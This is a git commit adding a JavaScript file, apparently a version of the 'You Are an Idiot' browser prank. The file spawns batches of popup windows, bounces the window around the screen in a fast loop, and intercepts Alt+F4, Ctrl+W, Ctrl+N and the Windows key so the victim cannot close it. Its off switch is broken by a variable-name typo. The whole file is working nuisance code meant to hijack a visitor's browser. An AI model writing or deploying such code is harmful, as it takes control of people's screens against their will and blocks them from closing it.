90f483a2f399b1cdb7978105cd7843c4b23f73c2
andreabaez0101-arch <andreabaez0101@gmail.com>
2026-04-28 12:16:01 -0400

    Add files via upload

---
+++ you.js
@@ -0,0 +1,79 @@
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = -100;
+var flagRun = 1;
+
+function openWindow(url){
+    aWindow = window.open(url, "_blank", 'menubar=no,status=no,toolbar=no,resizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
+}
+
+function procreate(){
+    openWindow('open.html');
+    openWindow('open.html');
+    openWindow('open.html');
+    openWindow('open.html');
+    openWindow('open.html');
+    openWindow('open.html');
+}
+
+function newXlt(){
+    xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+    window.focus();
+}
+
+function newXrt(){
+    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+
+function newYup(){
+    yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+}
+
+function newYdn(){
+    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+
+function fOff(){
+    flagrun = 0;
+}
+
+function playBall(){
+    xPos += xOff;
+    yPos += yOff;
+    if (xPos > screen.width - 175) newXlt();
+    if (xPos < 0) newXrt();
+    if (yPos > screen.height - 100) newYup();
+    if (yPos < 0) newYdn();
+    if (flagRun == 1){
+        window.moveTo(xPos, yPos);
+        setTimeout('playBall()', 1);
+    }
+}
+
+// Bloqueo de teclas de cierre
+function altf4key(){
+    return false;
+}
+function ctrlkey(){
+    return false;
+}
+function delkey(){
+    return false;
+}
+document.onkeydown = function(e) {
+    e = e || window.event;
+    // Bloquear Alt+F4
+    if (e.altKey && (e.keyCode == 115 || e.keyCode == 18)) {
+        return false;
+    }
+    // Bloquear Ctrl+W, Ctrl+N
+    if (e.ctrlKey && (e.keyCode == 87 || e.keyCode == 78)) {
+        return false;
+    }
+    // Bloquear tecla Windows
+    if (e.keyCode == 91 || e.keyCode == 92) {
+        return false;
+    }
+    return true;
+};
